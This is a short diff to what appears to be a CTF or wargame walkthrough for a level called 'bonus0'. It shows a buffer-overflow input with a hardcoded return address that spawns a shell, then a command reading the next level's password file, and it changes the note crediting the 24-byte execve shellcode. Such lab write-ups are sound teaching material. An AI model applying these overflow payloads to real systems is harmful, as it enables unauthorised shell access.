@@ -46,10 +46,9 @@
    (python -c 'print "A"*20'; python -c 'print "B"*9 + "\x58\xfd\xff\xbf" + "C"*7'; cat) | ./bonus0
    
    Note: The 'cat' command keeps stdin open for shell interaction.
-   
-   Shellcode source: https://www.exploit-db.com/shellcodes/42428
-   Author: Touhid M.Shaikh
-   Length: 24 bytes (Linux x86 execve /bin/sh)
+    
+    Shellcode: 24-byte null-free execve from level2 (Exploit-DB #42428)
+    See level2 documentation for detailed shellcode analysis.
 
 7. Read the password:
    cat /home/user/bonus1/.pass
